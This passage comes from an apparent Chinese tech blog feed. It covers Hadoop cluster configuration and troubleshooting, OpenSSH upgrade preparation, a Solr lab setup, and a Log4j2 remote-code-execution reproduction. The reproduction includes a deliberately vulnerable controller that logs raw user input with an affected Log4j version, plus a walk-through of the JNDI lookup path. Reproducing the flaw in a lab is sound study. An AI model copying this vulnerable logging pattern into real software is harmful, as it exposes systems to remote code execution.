historyserver</span><br></pre></td></tr></table></figure><p><strong>4 ） 查看历史服务器是否启动</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop]$ jps</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/55.png" alt="在这里插入图片描述"></p><p><strong>5 ）看 查看 JobHistory</strong><br><a href="http://hadoop102:19888/jobhistory" target="_blank" rel="noopener">http://hadoop102:19888/jobhistory</a></p><h3 id="4-2-7-配置日志的聚集"><a href="#4-2-7-配置日志的聚集" class="headerlink" title="4.2.7 配置日志的聚集"></a>4.2.7 配置日志的聚集</h3><p>日志聚集概念：应用运行完成以后，将程序运行日志信息上传到 HDFS 系统上。<br><img src="/2022/04/11/21104/56.png" alt="在这里插入图片描述"><br>日志聚集功能好处：可以方便的查看到程序运行详情，方便开发调试。<br>注意：开启日志聚集功能，需要重新启动 NodeManager 、ResourceManager<br>和HistoryServer。<br>开启日志聚集功能具体步骤如下：<br><strong>1 ）置 配置 yarn-site.xml</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop]$ vim yarn-site.xml</span><br></pre></td></tr></table></figure><p>在该文件里面增加如下配置。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 开启日志聚集功能 --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;yarn.log-aggregation-enable&lt;&#x2F;name&gt;</span><br><span class="line">    &lt;value&gt;true&lt;&#x2F;value&gt;</span><br><span class="line">&lt;&#x2F;property&gt;</span><br><span class="line">&lt;!-- 设置日志聚集服务器地址 --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;yarn.log.server.url&lt;&#x2F;name&gt;</span><br><span class="line">    &lt;value&gt;http:&#x2F;&#x2F;hadoop102:19888&#x2F;jobhistory&#x2F;logs&lt;&#x2F;value&gt;</span><br><span class="line">&lt;&#x2F;property&gt;</span><br><span class="line">&lt;!-- 设置日志保留时间为 7 天 --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;yarn.log-aggregation.retain-seconds&lt;&#x2F;name&gt;</span><br><span class="line">    &lt;value&gt;604800&lt;&#x2F;value&gt;</span><br><span class="line">&lt;&#x2F;property&gt;</span><br></pre></td></tr></table></figure><p><strong>2 ） 分发配置</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop]$ xsync $HADOOP_HOME&#x2F;etc&#x2F;hadoop&#x2F;yarn-site.xml</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/57.png" alt="在这里插入图片描述"></p><p><strong>3 ） 关闭 NodeManager 、ResourceManager 和 和 HistoryServer</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop103 hadoop-3.1.3]$ sbin&#x2F;stop-yarn.sh</span><br><span class="line">[xusheng@hadoop103 hadoop-3.1.3]$ mapred --daemon stop historyserver</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/58.png" alt="在这里插入图片描述"><br><img src="/2022/04/11/21104/59.png" alt="在这里插入图片描述"></p><p><strong>4 ） 启动 NodeManager 、ResourceManage 和 和 HistoryServer</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop103 ~]$ start-yarn.sh</span><br><span class="line">[xusheng@hadoop102 ~]$ mapred --daemon start historyserver</span><br></pre></td></tr></table></figure><p><strong>5 ） 删除 HDFS 上已经存在的 输出 文件</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ hadoop fs -rm -r &#x2F;output</span><br></pre></td></tr></table></figure><p><strong>6 ） 执行 WordCount 程序</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 hadoop-3.1.3]$ hadoop jar</span><br><span class="line">share&#x2F;hadoop&#x2F;mapreduce&#x2F;hadoop-mapreduce-examples-3.1.3.jar</span><br><span class="line">wordcount &#x2F;input &#x2F;output</span><br></pre></td></tr></table></figure><p><strong>7 ） 查看日志</strong><br>（1）历史服务器地址<br><a href="http://hadoop102:19888/jobhistory" target="_blank" rel="noopener">http://hadoop102:19888/jobhistory</a><br>（2）历史任务列表<br><img src="/2022/04/11/21104/60.png" alt="在这里插入图片描述"><br>（3）查看任务运行日志<br><img src="/2022/04/11/21104/61.png" alt="在这里插入图片描述"><br>（4）运行日志详情<br><img src="/2022/04/11/21104/62.png" alt="在这里插入图片描述"></p><h3 id="4-2-8-集群启动-停止方式总结"><a href="#4-2-8-集群启动-停止方式总结" class="headerlink" title="4.2.8 集群启动/停止方式总结"></a>4.2.8 集群启动/停止方式总结</h3><p><strong>1 ） 各个模块分开启动/ 停止 （配置 ssh 是前提） 常用</strong><br>（1）整体启动/停止 HDFS</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">start-dfs.sh&#x2F;stop-dfs.sh</span><br></pre></td></tr></table></figure><p>（2）整体启动/停止 YARN</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">start-yarn.sh&#x2F;stop-yarn.sh</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/63.png" alt="在这里插入图片描述"></p><p><strong>2 ） 各个服务组件逐一启动/ 停止</strong><br>（1）分别启动/停止 HDFS 组件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hdfs --daemon start&#x2F;stop namenode&#x2F;datanode&#x2F;secondarynamenode</span><br></pre></td></tr></table></figure><p>（2）启动/停止 YARN</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yarn --daemon start&#x2F;stop resourcemanager&#x2F;nodemanager</span><br></pre></td></tr></table></figure><h3 id="4-2-9-编写Hadoop集群常用脚本"><a href="#4-2-9-编写Hadoop集群常用脚本" class="headerlink" title="4.2.9 编写Hadoop集群常用脚本"></a>4.2.9 编写Hadoop集群常用脚本</h3><p><strong>1 ）Hadoop 集群启停脚本（包含 HDFS ，Yarn ，Historyserver<br>）：myhadoop.sh</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ cd &#x2F;home&#x2F;xusheng&#x2F;bin</span><br><span class="line">[xusheng@hadoop102 bin]$ vim myhadoop.sh</span><br></pre></td></tr></table></figure><p>➢ 输入如下内容</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">if [ $# -lt 1 ]</span><br><span class="line">then</span><br><span class="line">    echo &quot;No Args Input...&quot;</span><br><span class="line">    exit ;</span><br><span class="line">fi</span><br><span class="line">case $1 in</span><br><span class="line">&quot;start&quot;)</span><br><span class="line">        echo &quot; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 启动 hadoop 集群&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;</span><br><span class="line">        </span><br><span class="line">        echo &quot; --------------- 启动 hdfs ---------------&quot;</span><br><span class="line">        ssh hadoop102 &quot;&#x2F;opt&#x2F;module&#x2F;hadoop-3.1.3&#x2F;sbin&#x2F;start-dfs.sh&quot;</span><br><span class="line">        echo &quot; --------------- 启动 yarn ---------------&quot;</span><br><span class="line">        ssh hadoop103 &quot;&#x2F;opt&#x2F;module&#x2F;hadoop-3.1.3&#x2F;sbin&#x2F;start-yarn.sh&quot;</span><br><span class="line">        echo &quot; --------------- 启动 historyserver ---------------&quot;</span><br><span class="line">        ssh hadoop102 &quot;&#x2F;opt&#x2F;module&#x2F;hadoop-3.1.3&#x2F;bin&#x2F;mapred --daemon start historyserver&quot;</span><br><span class="line">;;</span><br><span class="line">&quot;stop&quot;)</span><br><span class="line">        echo &quot; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 关闭 hadoop 集群 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;</span><br><span class="line">        echo &quot; --------------- 关闭 historyserver ---------------&quot;</span><br><span class="line">        ssh hadoop102 &quot;&#x2F;opt&#x2F;module&#x2F;hadoop-3.1.3&#x2F;bin&#x2F;mapred --daemon stop historyserver&quot;</span><br><span class="line">        echo &quot; --------------- 关闭 yarn ---------------&quot;</span><br><span class="line">        ssh hadoop103 &quot;&#x2F;opt&#x2F;module&#x2F;hadoop-3.1.3&#x2F;sbin&#x2F;stop-yarn.sh&quot;</span><br><span class="line">        echo &quot; --------------- 关闭 hdfs ---------------&quot;</span><br><span class="line">        ssh hadoop102 &quot;&#x2F;opt&#x2F;module&#x2F;hadoop-3.1.3&#x2F;sbin&#x2F;stop-dfs.sh&quot;</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">    echo &quot;Input Args Error...&quot;</span><br><span class="line">;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/64.png" alt="在这里插入图片描述"></p><p>➢ 保存后退出，然后赋予脚本执行权限</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 bin]$ chmod +x myhadoop.sh</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/65.png" alt="在这里插入图片描述"><br><img src="/2022/04/11/21104/66.png" alt="在这里插入图片描述"></p><p><strong>2 ）查看三台服务器 Java 进程脚本：jpsall</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ cd &#x2F;home&#x2F;xusheng&#x2F;bin</span><br><span class="line">[xusheng@hadoop102 bin]$ vim jpsall</span><br></pre></td></tr></table></figure><p>➢ 输入如下内容</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">for host in hadoop102 hadoop103 hadoop104</span><br><span class="line">do</span><br><span class="line">        echo &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; $host &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">        ssh $host jps</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>➢ 保存后退出，然后赋予脚本执行权限</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 bin]$ chmod +x jpsall</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/21104/67.png" alt="在这里插入图片描述"></p><p><strong>3 ）分发/home/xusheng/bin 目录，保证自定义脚本在三台机器上都可以使用</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ xsync &#x2F;home&#x2F;xusheng&#x2F;bin&#x2F;</span><br></pre></td></tr></table></figure><h3 id="4-2-10-常用端口号说明"><a href="#4-2-10-常用端口号说明" class="headerlink" title="4.2.10 常用端口号说明"></a>4.2.10 常用端口号说明</h3><p><img src="/2022/04/11/21104/68.png" alt="在这里插入图片描述"></p><h3 id="4-2-11-集群时间同步"><a href="#4-2-11-集群时间同步" class="headerlink" title="4.2.11 集群时间同步"></a>4.2.11 集群时间同步</h3><p>如果服务器在公网环境（能连接外网），可以不采用集群时间同步，因为服务器会定期和公网时间进行校准；<br>如果服务器在内网环境，必须要配置集群时间同步，否则时间久了，会产生时间偏差，导致集群执行任务时间不同步。<br><strong>1 ）需求</strong><br>找一个机器，作为时间服务器，所有的机器与这台集群时间进行定时的同步，生产环境根据任务对时间的准确程度要求周期同步。测试环境为了尽快看到效果，采用<br>1 分钟同步一次。<br><img src="/2022/04/11/21104/69.png" alt="在这里插入图片描述"><br><strong>2 ） 时间服务器配置（必须 root 用户）</strong><br>（1）查看所有节点 ntpd 服务状态和开机自启动状态</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ sudo systemctl status ntpd</span><br><span class="line">[xusheng@hadoop102 ~]$ sudo systemctl start ntpd</span><br><span class="line">[xusheng@hadoop102 ~]$ sudo systemctl is-enabled ntpd</span><br></pre></td></tr></table></figure><p>（2）修改 hadoop102 的 ntp.conf 配置文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ sudo vim &#x2F;etc&#x2F;ntp.conf</span><br></pre></td></tr></table></figure><p>修改内容如下<br>（a）修改 1（授权 192.168.10.0-192.168.10.255<br>网段上的所有机器可以从这台机器上查询和同步时间）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#restrict 192.168.10.0 mask 255.255.255.0 nomodify notrap</span><br></pre></td></tr></table></figure><p>为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">restrict 192.168.10.0 mask 255.255.255.0 nomodify notrap</span><br></pre></td></tr></table></figure><p>（b）修改 2（集群在局域网中，不使用其他互联网上的时间）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server 0.centos.pool.ntp.org iburst</span><br><span class="line">server 1.centos.pool.ntp.org iburst</span><br><span class="line">server 2.centos.pool.ntp.org iburst</span><br><span class="line">server 3.centos.pool.ntp.org iburst</span><br></pre></td></tr></table></figure><p>为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#server 0.centos.pool.ntp.org iburst</span><br><span class="line">#server 1.centos.pool.ntp.org iburst</span><br><span class="line">#server 2.centos.pool.ntp.org iburst</span><br><span class="line">#server 3.centos.pool.ntp.org iburst</span><br></pre></td></tr></table></figure><p>（c）添加 3 （<br>当该节点丢失网络连接，依然可以采用本地时间作为时间服务器为集群中<br>的其他节点提供时间同步 ）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server 127.127.1.0</span><br><span class="line">fudge 127.127.1.0 stratum 10</span><br></pre></td></tr></table></figure><p>（3）修改 hadoop102 的/etc/sysconfig/ntpd 文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ sudo vim &#x2F;etc&#x2F;sysconfig&#x2F;ntpd</span><br></pre></td></tr></table></figure><p>增加内容如下（让硬件时间与系统时间一起同步）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SYNC_HWCLOCK&#x3D;yes</span><br></pre></td></tr></table></figure><p>（4）重新启动 ntpd 服务</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ sudo systemctl start ntpd</span><br></pre></td></tr></table></figure><p>（5）设置 ntpd 服务开机启动</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 ~]$ sudo systemctl enable ntpd</span><br></pre></td></tr></table></figure><p><strong>3 ） 其他机器配置（必须 root 用户）</strong><br>（1）关闭所有节点上 ntp 服务和自启动</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop103 ~]$ sudo systemctl stop ntpd</span><br><span class="line">[xusheng@hadoop103 ~]$ sudo systemctl disable ntpd</span><br><span class="line">[xusheng@hadoop104 ~]$ sudo systemctl stop ntpd</span><br><span class="line">[xusheng@hadoop104 ~]$ sudo systemctl disable ntpd</span><br></pre></td></tr></table></figure><p>（2）在其他机器配置 1 分钟与时间服务器同步一次</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop103 ~]$ sudo crontab -e</span><br></pre></td></tr></table></figure><p>编写定时任务如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*&#x2F;1 * * * * &#x2F;usr&#x2F;sbin&#x2F;ntpdate hadoop102</span><br></pre></td></tr></table></figure><p>（3）修改任意机器时间</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop103 ~]$ sudo date -s &quot;2021-9-11 11:11:11&quot;</span><br></pre></td></tr></table></figure><p>（4）1 分钟后查看机器是否与时间服务器同步</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop103 ~]$ sudo date</span><br></pre></td></tr></table></figure><h1 id="五、常见错误及解决方案"><a href="#五、常见错误及解决方案" class="headerlink" title="五、常见错误及解决方案"></a>五、常见错误及解决方案</h1><p>1）防火墙没关闭、或者没有启动 YARN</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INFO client.RMProxy: Connecting to ResourceManager at hadoop108&#x2F;192.168.10.108:8032</span><br></pre></td></tr></table></figure><p>2）主机名称配置错误<br>3）IP 地址配置错误<br>4）ssh 没有配置好<br>5）root 用户和 xusheng两个用户启动集群不统一<br>6）配置文件修改不细心<br>7）不识别主机名称</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.net.UnknownHostException: hadoop102: hadoop102</span><br><span class="line">at</span><br><span class="line">java.net.InetAddress.getLocalHost(InetAddress.java:1475)</span><br><span class="line">at</span><br><span class="line">org.apache.hadoop.mapreduce.JobSubmitter.submitJobInternal(Job</span><br><span class="line">Submitter.java:146)</span><br><span class="line">at org.apache.hadoop.mapreduce.Job$10.run(Job.java:1290)</span><br><span class="line">at org.apache.hadoop.mapreduce.Job$10.run(Job.java:1287)</span><br><span class="line">at java.security.AccessController.doPrivileged(Native</span><br><span class="line">Method)</span><br><span class="line">at javax.security.auth.Subject.doAs(Subject.java:415)</span><br></pre></td></tr></table></figure><p>解决办法：<br>（1）在/etc/hosts 文件中添加 192.168.10.102 hadoop102<br>（2）主机名称不要起 hadoop hadoop000 等特殊名称<br>8）DataNode 和 NameNode 进程同时只能工作一个。<br><img src="/2022/04/11/21104/70.png" alt="在这里插入图片描述"><br>9）执行命令不生效，粘贴 Word中命令时，遇到-和长–没区分开。导致命令失效解决办法：尽量不要粘贴 Word 中代码。<br>10）jps 发现进程已经没有，但是重新启动集群，提示进程已经开启。原因是在 Linux 的根目录下/tmp目录中存在启动的进程临时文件，将集群相关进程删除掉，再重新启动集群。<br>11）jps 不生效原因：全局变量 hadoop java 没有生效。解决办法：需要 source /etc/profile文件。<br>12）8088 端口连接不上</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xusheng@hadoop102 桌面]$ cat &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure><p>注释掉如下代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">#::1 hadoop102</span><br></pre></td></tr></table></figure><p>13) 启动hdfs时遇到如下报错</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ERROR: Attempting to operate on hdfs namenode as root</span><br><span class="line">ERROR: but there is no HDFS_NAMENODE_USER defined. Aborting operation.</span><br><span class="line">Starting datanodes</span><br><span class="line">ERROR: Attempting to operate on hdfs datanode as root</span><br><span class="line">ERROR: but there is no HDFS_DATANODE_USER defined. Aborting operation.</span><br><span class="line">Starting secondary namenodes [node03]</span><br><span class="line">ERROR: Attempting to operate on hdfs secondarynamenode as root</span><br><span class="line">ERROR: but there is no HDFS_SECONDARYNAMENODE_USER defined. Aborting operation.</span><br></pre></td></tr></table></figure><p>猜想应该是用root用户启动的，ssh免登陆做的也是root用户</p><blockquote><p>解决</p><p>对于start-dfs.sh和stop-dfs.sh文件，添加下列参数：</p><p>HDFS_DATANODE_USER=root<br>HADOOP_SECURE_DN_USER=hdfs<br>HDFS_NAMENODE_USER=root<br>HDFS_SECONDARYNAMENODE_USER=root<br>对于start-yarn.sh和stop-yarn.sh文件，添加下列参数：</p><p>YARN_RESOURCEMANAGER_USER=root<br>HADOOP_SECURE_DN_USER=yarn<br>YARN_NODEMANAGER_USER=root</p></blockquote><p>14) JAVA_HOME找不到错误，但本机JAVA_HOME配置正确，直接修改$HADOOP_HOME/etc/hadoop/hdoop-env.sh</p><p>放开export JAVA_HOME=$JAVA_HOME注释，替换成真实JAVA_HOME路径</p><p>15) 完全分布式运行模式，执行wordcount示例程序卡在<code>INFO mapreduce.Job: Running job</code></p><p>在yarn-site.xml中加</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;yarn.nodemanager.resource.memory-mb&lt;&#x2F;name&gt;</span><br><span class="line">    &lt;value&gt;2048&lt;&#x2F;value&gt;</span><br><span class="line">&lt;&#x2F;property&gt;</span><br></pre></td></tr></table></figure><p>文章转自<a href="https://blog.csdn.net/m0_52435951/article/details/123986924?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-5.pc_relevant_default&amp;spm=1001.2101.3001.4242.4&amp;utm_relevant_index=8，学习用，如有侵权，联系删" target="_blank" rel="noopener">https://blog.csdn.net/m0_52435951/article/details/123986924?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-5.pc_relevant_default&amp;spm=1001.2101.3001.4242.4&amp;utm_relevant_index=8，学习用，如有侵权，联系删</a></p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>hadoop，大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>log4j渗透solr</title>
    <url>/2022/02/16/23212/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><h1 id="搭建solr环境"><a href="#搭建solr环境" class="headerlink" title="搭建solr环境"></a>搭建solr环境</h1><p>进入solr官网<a href="https://solr.apache.org/下载solr。" target="_blank" rel="noopener">https://solr.apache.org/下载solr。</a></p><p>解压，进入bin目录，cmd执行<code>solr start</code>启动solr</p><p>solr添加core，cmd执行<code>solr create -c corename</code></p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透，Log4j,solr</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7离线升级OpenSSH8.8</title>
    <url>/2021/12/22/17347/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><p>生产环境服务器安全扫描出OpenSSH漏洞问题，<strong>CVE-2021-41617</strong>，<strong>CVE-2020-15778</strong>，<strong>CVE-2017-15906</strong>，<strong>CVE-2018-15919</strong>，决定将OpenSSH版本升级至8.8</p><a id="more"></a><h1 id="安装telnet"><a href="#安装telnet" class="headerlink" title="安装telnet"></a>安装telnet</h1><p>为防止升级OpenSSH异常导致不可登录，先安装telnet服务。</p><ol><li><p>上传如下的rpm安装包</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;mirrors.163.com&#x2F;centos&#x2F;7.9.2009&#x2F;os&#x2F;x86_64&#x2F;Packages&#x2F;telnet-0.17-65.el7_8.x86_64.rpm</span><br><span class="line">http:&#x2F;&#x2F;mirrors.163.com&#x2F;centos&#x2F;7.9.2009&#x2F;os&#x2F;x86_64&#x2F;Packages&#x2F;telnet-server-0.17-65.el7_8.x86_64.rpm</span><br><span class="line">http:&#x2F;&#x2F;mirrors.163.com&#x2F;centos&#x2F;7.9.2009&#x2F;os&#x2F;x86_64&#x2F;Packages&#x2F;xinetd-2.3.15-14.el7.x86_64.rpm</span><br></pre></td></tr></table></figure></li><li><p>安装rpm安装包</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm -ivh telnet-0.17-65.el7_8.x86_64.rpm</span><br><span class="line">rpm -ivh telnet-server-0.17-65.el7_8.x86_64.rpm</span><br><span class="line">rpm -ivh telnet-0.17-65.el7_8.x86_64.rpm</span><br></pre></td></tr></table></figure></li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>修复漏洞</category>
      </categories>
      <tags>
        <tag>OpenSSH</tag>
      </tags>
  </entry>
  <entry>
    <title>Log4j2远程代码执行漏洞复现</title>
    <url>/2021/12/17/13818/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:31:43 GMT+0800 (GMT+08:00) --><p>2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞，12月10日早上，技术交流群开始热闹起来，公司群也发出升级Log4j2版本的公告。</p><p>Apache Log4j2 是 Apache 的一个开源项目，Apache Log4j2 是一个基于 Java 的日志记录工具，使用非常广泛，被大量企业和系统使用，漏洞触发及其简单，攻击者可直接构造恶意请求，触发远程代码执行漏洞。</p><p><strong>影响范围：Apache Log4j 2.x&lt;=2.14.1</strong>,2.15.0-rc1 版本存在绕过。</p><a id="more"></a><h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>新建一个springboot项目，依赖如下</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-log4j2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本次演示<strong>springboot</strong>版本为2.1.7，<strong>spring-boot-starter-log4j2</strong>默认版本为2.11.2，后续<strong>spring-boot-starter-log4j2</strong>版本升级的话，可以加入版本限制。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;properties&gt;</span><br><span class="line">        &lt;java.version&gt;1.8&lt;&#x2F;java.version&gt;</span><br><span class="line">        &lt;log4j2.version&gt;2.17.1&lt;&#x2F;log4j2.version&gt;</span><br><span class="line">&lt;&#x2F;properties&gt;</span><br></pre></td></tr></table></figure><p>新建controller控制器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"test"</span>)</span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"a"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(String param)</span> </span>&#123;</span><br><span class="line">        log.info(param);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Log4J执行JNDI分析"><a href="#Log4J执行JNDI分析" class="headerlink" title="Log4J执行JNDI分析"></a>Log4J执行JNDI分析</h1><p><img src="/2021/12/17/13818/1.jpg" alt></p><p>log中包含<code>${</code>，进入</p><p><img src="/2021/12/17/13818/2.jpg" alt="1641646569984"></p><p><img src="/2021/12/17/13818/3.jpg" alt></p><p><img src="/2021/12/17/13818/4.jpg" alt></p><p><img src="/2021/12/17/13818/5.jpg" alt></p><p>根据<code>:</code>分割，拿到前缀，根据前缀字符串获取对应的Lookup对象。此处获取到JndiLookup对象。</p><p><img src="/2021/12/17/13818/6.jpg" alt></p><p><img src="/2021/12/17/13818/7.jpg" alt></p><p>到此处，就是JDK的JNDI处理了</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透，Log4j,JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>zookeeper集群搭建</title>
    <url>/2021/12/02/8161/</url>
